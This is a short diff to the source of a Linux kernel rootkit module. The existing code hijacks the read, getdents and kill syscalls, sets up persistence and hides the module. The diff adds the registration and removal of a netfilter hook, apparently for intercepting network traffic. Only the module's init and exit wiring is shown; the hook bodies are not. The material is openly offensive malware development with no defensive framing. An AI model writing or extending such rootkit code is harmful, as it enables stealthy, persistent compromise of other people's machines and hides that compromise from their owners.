@@ -7,7 +7,9 @@
 #include "hooked_funcs/h_read.h"
 #include "hooked_funcs/h_getdents.h"
 #include "hooked_funcs/h_kill.h"
+#include "hooked_funcs/h_netfilter.h"
 #include "persistence.h"
+
 
 static __init int rootkit_init(void)
 {
@@ -17,6 +19,7 @@ static __init int rootkit_init(void)
     hijack_getdents();
     hijack_kill();
     persistence();
+    register_netfilter_hook();
 
     module_hide();
 
@@ -28,6 +31,7 @@ static __exit void rootkit_exit(void)
     restore_kill();
     restore_getdents();
     restore_read();
+    unregister_netfilter_hook();
     return;
 }
 
